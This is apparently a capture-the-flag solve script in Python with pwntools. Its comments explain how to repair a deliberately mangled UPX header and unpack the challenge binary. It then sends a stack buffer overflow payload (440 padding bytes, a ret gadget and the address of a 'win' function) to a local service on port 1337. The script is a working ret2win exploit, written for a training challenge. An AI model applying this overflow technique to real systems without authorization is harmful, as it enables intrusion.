# NOTE: you must realize this is a UPX packed binary, and unpack it first!
# i mangled the UPX header, so you must use a hex editor to replace the XXX at 0xEC with UPX (see chal_unmangled)
# then you run `upx -d -o chal_unpacked chal_unmangled`, and can solve from there like any other binary!

from pwn import *
elf = context.binary = ELF("chal")
elf_unpacked = ELF("chal_unpacked")
p = remote("localhost", 1337) #process()
p.clean()
p.sendline(b"A"*440 + p64(0x401016) + p64(elf_unpacked.sym["win"])) # ret to fix movaps
p.interactive()